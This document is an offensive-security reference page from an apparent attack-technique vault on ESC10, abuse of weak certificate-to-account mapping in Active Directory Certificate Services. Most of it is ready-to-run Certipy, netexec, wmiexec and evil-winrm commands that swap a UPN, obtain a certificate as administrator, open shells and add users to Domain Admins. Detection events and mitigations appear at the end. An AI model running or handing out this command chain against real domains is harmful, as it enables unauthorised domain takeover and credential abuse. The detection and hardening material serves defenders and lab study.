---
title: "ESC10 — Weak Certificate Mapping"
description: "ESC10 exploits weak certificate-to-account mapping enforcement on the Domain Controller. When the DC receives a certificate for authentication, it must…"
category: active-directory
tags: ["active-directory", "kerberos", "adcs"]
tools: ["NetExec", "Certipy", "BloodHound", "Evil-WinRM"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/ESC10 — Weak Certificate Mapping.md"
---
# ESC10 — Weak Certificate Mapping

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | DC Configuration Abuse |
| **Difficulty** | Medium |
| **Pre-requisites** | GenericWrite over an account + weak mapping registry settings on DC |
| **Tools** | Certipy, BloodHound, netexec |
| **OPSEC Noise** | Medium — UPN/DNS attribute changes generate AD change events |
| **One-liner** | Abuse weak certificate-to-account mapping on the DC to impersonate any user via UPN/DNS swap, similar to ESC9/ESC16 but caused by DC registry settings. |

***

## What Is ESC10?

ESC10 exploits **weak certificate-to-account mapping enforcement** on the Domain Controller. When the DC receives a certificate for authentication, it must determine which AD account the certificate belongs to. This "mapping" process can be **strong** (cryptographically verified via objectSID extension) or **weak** (trusting the UPN/DNS in the certificate without SID verification).

ESC10 has **two distinct variants** based on which authentication protocol uses weak mapping:

| Variant | Protocol | Registry Key | Vulnerable Value |
|---------|----------|-------------|-----------------|
| **ESC10a** | Kerberos (PKINIT) | `StrongCertificateBindingEnforcement` | `0` |
| **ESC10b** | Schannel (LDAPS/TLS) | `CertificateMappingMethods` | Contains `0x04` (UPN mapping bit) |

***

## ESC10 vs ESC9 vs ESC16 — Why They Look Similar But Aren't

All three use UPN/DNS swap → request cert → restore. The **root cause** differs:

| | ESC9 | ESC10 | ESC16 |
|---|---|---|---|
| **Root cause** | Template flag `CT_FLAG_NO_SECURITY_EXTENSION` | **DC registry weak mapping** | CA-wide `DisableExtensionList` |
| **SID extension in cert?** | ❌ (template strips it) | ✅ (SID IS present, but DC ignores it) | ❌ (CA strips it) |
| **Where weakness lives** | Certificate Template | **Domain Controller** | Certificate Authority |
| **Blocked by StrongBinding=2?** | ✅ | ❌ ESC10a requires value=0 | ❌ |

***

## Required Conditions — ESC10a (Kerberos)

| Condition | Where to Check |
|-----------|----------------|
| `StrongCertificateBindingEnforcement = 0` on DC | Registry: `HKLM\SYSTEM\CurrentControlSet\Services\Kdc` |
| Attacker has `GenericWrite` over an account | BloodHound ACE edges |
| That account can enroll in a Client Auth template | Template enrollment rights |

## Required Conditions — ESC10b (Schannel)

| Condition | Where to Check |
|-----------|----------------|
| `CertificateMappingMethods` contains UPN bit (`0x04`) | Registry: `HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel` |
| Attacker has `GenericWrite` over an account | BloodHound ACE edges |
| That account can enroll in a Client Auth template | Template enrollment rights |
| LDAPS is enabled on DC | Port 636 accessible |

***

## Step 0 — Enumeration

```bash
# Check StrongCertificateBindingEnforcement
netexec smb $TARGET -u 'lowpriv' -p 'Password123!' \
  -x 'reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement'
# 0 = ESC10a exploitable
# 1 = Compatibility mode (may still work in some scenarios)
# 2 = Full enforcement (blocked)

# Check CertificateMappingMethods
netexec smb $TARGET -u 'lowpriv' -p 'Password123!' \
  -x 'reg query "HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel" /v CertificateMappingMethods'
# If value contains 0x4 = UPN mapping enabled = ESC10b exploitable
# Default value 0x1F = ALL methods enabled = ESC10b exploitable

# Standard certipy scan
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -vulnerable -stdout
```

***

## ESC10a Full Attack Chain — Kerberos (UPN Swap)

The chain is similar to ESC9/ESC16 — swap UPN, request cert, restore, authenticate.

### Step 1 — Note Current UPN of Controlled Account
```bash
certipy-ad account \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -user 'targetuser' \
  lookup
# Note: targetuser@domain.htb
```

### Step 2 — Swap UPN to Administrator
```bash
certipy-ad account \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -user 'targetuser' \
  -upn 'administrator' \
  update
```

### Step 3 — Request Certificate
```bash
certipy-ad req \
  -u 'targetuser@domain.htb' \
  -p 'TargetPass!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'User'

# Certificate WILL contain objectSID of targetuser
# But StrongCertificateBindingEnforcement=0 means DC ignores it
```

### Step 4 — Restore UPN Immediately
```bash
certipy-ad account \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -user 'targetuser' \
  -upn 'targetuser@domain.htb' \
  update
```

### Step 5 — Authenticate
```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain domain.htb \
  -dc-ip $TARGET

# DC maps cert to administrator via UPN (ignoring SID mismatch)
```

### Step 6 — Shell
```bash
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass DC01.domain.htb
evil-winrm -i $TARGET -u administrator -H <NTHASH>
```

***

## ESC10b Full Attack Chain — Schannel (LDAPS Auth)

ESC10b is different — instead of using PKINIT for Kerberos auth, you authenticate directly to **LDAPS** using the forged certificate. The DC's Schannel provider maps the cert to a user via the weak UPN method.

### Steps 1–4 — Same as ESC10a (UPN swap, request cert, restore)

### Step 5 — Authenticate via Schannel (LDAPS)

```bash
# Use certipy with -ldap-shell flag for Schannel authentication
certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain domain.htb \
  -dc-ip $TARGET \
  -ldap-shell

# This gives you an LDAP shell as administrator
# From here you can:
# - Add yourself to Domain Admins
# - Perform Shadow Credentials attack
# - Dump LDAP data

# In the LDAP shell:
> add_user_to_group administrator "Domain Admins"
> set_rbcd EVILPC$ DC01$
```

> 💡 ESC10b via Schannel is particularly useful when PKINIT is disabled or when `StrongCertificateBindingEnforcement` is set to 2 (blocking ESC10a) but `CertificateMappingMethods` still has UPN mapping enabled.

***

## OPSEC Considerations

| Action | Log Generated | Noise Level |
|--------|--------------|-------------|
| Registry query (remote) | Security Event 4688 (process creation) | 🟡 Medium |
| UPN modification | Event ID 4738 (user account changed) | 🔴 High |
| Certificate request | Event ID 4886/4887 on CA | 🟡 Medium |
| LDAPS auth (ESC10b) | Event ID 4624 Type 10 via TLS | 🟡 Medium |

***

## Detection Indicators

- **Event ID 4738** — Rapid UPN change + revert (same pattern as ESC9/ESC16)
- **Event ID 4887** — Certificate issued where embedded SID doesn't match the UPN
- **Registry monitoring** — `StrongCertificateBindingEnforcement` or `CertificateMappingMethods` changed from enforced to weak values
- **LDAPS auth anomalies** — Certificate-based LDAPS logon from unexpected source IPs (ESC10b)

***

## Mitigation

- **Set `StrongCertificateBindingEnforcement = 2`** on all DCs — this is the single most important fix
- **Remove UPN mapping bit from `CertificateMappingMethods`** — set to `0x18` (SHA1 PublicKey + IssuerSerialNumber only) instead of the default `0x1F`
- **Audit `GenericWrite` ACEs** — the pre-requisite for the UPN swap
- **Apply KB5014754** and move beyond the compatibility period
- **Monitor UPN attribute changes** — alert on any `userPrincipalName` modification
